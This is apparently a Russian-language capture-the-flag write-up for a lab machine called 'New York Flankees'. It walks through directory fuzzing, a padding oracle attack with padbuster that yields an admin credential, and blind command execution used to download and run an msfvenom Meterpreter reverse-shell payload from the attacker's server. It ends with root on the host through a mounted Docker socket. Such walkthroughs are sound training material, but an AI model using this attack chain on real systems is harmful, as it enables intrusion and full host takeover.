# New York Flankees

### Необходимые навыки:
- Анализ исходного кода веб-страниц (HTML, базовый JavaScript)
- Базовое понимание криптографии (симметричное блочное шифрование AES-CBC) и эксплуатации уязвимости **Padding Oracle**
- Практический навык работы с Metasploit Framework и `msfvenom`
- Понимание архитектуры Docker-контейнеров и методов выхода из изолированной среды (Container Breakout)

### Разведка и получение начального доступа

Первоначальный этап — сканирование портов. Проверка UDP-портов не дала результатов, а вот сканирование TCP выявило два открытых порта. Наибольший интерес представляет веб-сервер на нестандартном порту 8080.

<img width="600" height="200" alt="image" src="https://github.com/user-attachments/assets/e5ebed20-9040-4389-be84-076d4aece372" />

Параллельно ручному исследованию сайта запускаем фаззинг директорий и скрытых страниц с помощью `ffuf`:
```bash
ffuf -u http://IP:8080/FUZZ -w rockyou.txt -e .html,.php -fs 4332
```
(Попытка фаззинга сабдоменов результатов не дала).

Фаззер обнаружил несколько интересных эндпоинтов:

<img width="600" height="83" alt="image" src="https://github.com/user-attachments/assets/0a17b876-9ca8-4e8e-8efa-2e7c0ebac1b9" />

Наличие `/exec.html` прямо указывает на возможный функционал командной строки (RCE - Remote Code Execution), скрытый за авторизацией. Для доступа к нему, очевидно, требуется залогиниться на `/login.html`.

#### Анализ страницы авторизации

При попытке входа на `/login.html` видно, что параметры передаются через GET-запрос. Это плохая практика с точки зрения безопасности, но прямых уязвимостей нам здесь не дает.

Первая гипотеза — наличие SQL-инъекции. Формируем файл с запросом через Burp Suite и передаем его в SQLmap:
```bash
sqlmap -r req \
--batch \       
--random-agent --ignore-code 401 \
--threads 5 \
--level 3 --risk 2 
# Флаги --level и --risk добавлены после того, как базовое сканирование показало отсутствие уязвимостей. --ignore-code 401 необходим для обхода HTTP-редиректа.
```
Результат: поля не уязвимы к SQLi. 

Переходим к анализу исходного кода (Client-Side). На странице обнаружен JavaScript-код, проверяющий наличие определенных cookie:

<img width="600" height="362" alt="image" src="https://github.com/user-attachments/assets/538cb3e9-9ae6-47dc-8832-874a9b9a3843" />

Была предпринята попытка манипуляции (Cookie Tampering) — установка `loggedin=true`. Визуально интерфейс изменился (кнопка "Admin Login" превратилась в "Debug" и стала вести на `/exec.html`), однако сервер по-прежнему отвечал кодом `401 Unauthorized`. Это означает, что валидация сессии реализована на стороне сервера (Backend), и подделка клиентских cookie ничего не дает.

#### Анализ /debug.html и эксплуатация Padding Oracle

Среди найденных фаззером страниц присутствует `/debug.html`. Просмотр ее исходного кода предоставляет важнейшую зацепку: комментарий разработчика с деталями реализации шифрования и зашифрованной строкой.

<img width="600" height="200" alt="image" src="https://github.com/user-attachments/assets/45b0a34d-b1f5-4e08-a9c1-03b6101a0912" />

В комментарии указано, что используется алгоритм **AES-CBC**. 
*Краткая справка:* Алгоритмы блочного шифрования (такие как AES в режиме CBC) требуют, чтобы размер данных был кратен размеру блока (обычно 16 байт). Если данных не хватает, применяется механизм "набивки" (Padding), например PKCS#7. Если сервер при попытке расшифровки данных по-разному реагирует на правильный и неправильный padding (например, возвращает разные HTTP-коды или тексты ошибок), возникает уязвимость **Padding Oracle**. Она позволяет атакующему побайтово расшифровать шифротекст, отправляя серверу специально модифицированные запросы и анализируя его ответы. *(Примечание: современные стандарты безопасности требуют использования режимов с аутентифицированным шифрованием, например AES-GCM, которые не подвержены этой уязвимости).*

Для автоматизации атаки Padding Oracle используем утилиту `padbuster`:

```bash
padbuster "http://10.113.187.37:8080/api/debug/value" "value" 16 -encoding 2 
```
*(Где 16 — размер блока в байтах, -encoding 2 — формат входных данных, часто Base64 или Hex).*

Атака проходит успешно! В результате мы получаем расшифрованную строку, содержащую учетные данные администратора: `stephan1197`. Авторизуемся с их помощью, получаем доступ к `/exec.html` и забираем **первый флаг**.

#### Получение Reverse Shell

Функционал на `/exec.html` представляет собой "слепую" командную строку (Blind RCE): при успешном выполнении команды сервер отвечает "ОК", при ошибке — выдает сообщение об ошибке. Вывод самих команд не отображается.

Попытки пробросить стандартный bash/netcat reverse shell потерпели неудачу (вероятно, из-за фильтрации символов или отсутствия необходимых бинарников в контейнере). 

В качестве альтернативы генерируем бинарный payload с помощью `msfvenom`:
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=your_ip LPORT=4444 -f elf -o RCE
```

Сценарий доставки и выполнения:
1. Запускаем локальный HTTP-сервер на машине атакующего: `python3 -m http.server 80`.
2. Через уязвимую командную строку `/exec.html` загружаем payload на сервер: `wget http://your_ip/RCE`.
3. Убеждаемся в логах python-сервера, что файл скачан.
4. Выдаем файлу права на исполнение: `chmod +x RCE`.
5. Настраиваем слушатель (Listener) в Metasploit Framework:
   ```bash
   msfconsole
   use exploit/multi/handler
   set payload linux/x64/meterpreter_reverse_tcp
   set LHOST your_ip
   set LPORT 4444
   run
   ```
   <img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/4dcb3d82-c300-4916-9510-8cc38bb665bb" />
6. Запускаем payload через `/exec.html`: `./RCE`.

Успешно получаем Meterpreter-сессию.

### Эскалация привилегий и выход из контейнера (Docker Breakout)

Первое, на что обращаем внимание после получения оболочки:
1. IP-адрес принадлежит внутренней сети Docker (обычно подсети `172.17.0.0/16` или подобные).
2. Мы уже обладаем правами пользователя `root`.
Это классические признаки того, что мы находимся в изолированной среде (контейнере).

<img width="600" height="180" alt="image" src="https://github.com/user-attachments/assets/7197c465-f30b-4006-b25b-92fdfc7d9a53" />

Переходим из Meterpreter в стандартный shell и стабилизируем его (upgrade to PTY):
```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Для автоматизированного сбора информации загружаем и запускаем скрипт `linpeas.sh` (используя тот же метод с `wget` и локальным python-сервером).
LinPEAS обнаруживает в переменных окружения (Environment Variables) **второй флаг**. *(Его также можно было найти вручную, прочитав файл `/app/docker_compose.yaml`).*

#### Docker Socket Breakout

Продолжая анализ вывода LinPEAS (или выполнив ручной поиск `find / -name docker.sock 2>/dev/null`), обнаруживаем критическую мисконфигурацию: **сокет Docker-демона хост-машины (`/var/run/docker.sock`) проброшен (mounted) внутрь нашего контейнера**.

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/20946329-2257-43ca-8e02-29a410bee615" />

Наличие доступа к сокету `docker.sock` эквивалентно наличию прав root на хостовой машине, так как Docker-демон работает с максимальными привилегиями. Мы можем отправлять ему команды напрямую из нашего контейнера.

План выхода из песочницы: создать новый контейнер, в котором корневая файловая система хоста (`/`) будет смонтирована в директорию внутри контейнера.

1. Смотрим список доступных образов (images) на хосте:
   ```bash
   docker images
   ```
2. Запускаем новый контейнер на базе любого доступного образа (например, `ubuntu` или `alpine`), монтируя хостовую файловую систему и переходя в интерактивный режим:
   ```bash
   docker run -v /:/mnt --rm -it alpine chroot /mnt sh
   ```
   *(Флаг `-v /:/mnt` монтирует корень хоста в папку `/mnt` контейнера. Команда `chroot /mnt sh` делает эту папку новым корнем для оболочки, по сути предоставляя нам полный доступ к файлам хостовой машины).*

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/5842843e-8cdb-41f5-892a-4ff448ef6756" />

Теперь мы находимся в окружении хостовой системы с правами root. Переходим в директорию `/root` и читаем **последний флаг**. Машина пройдена.
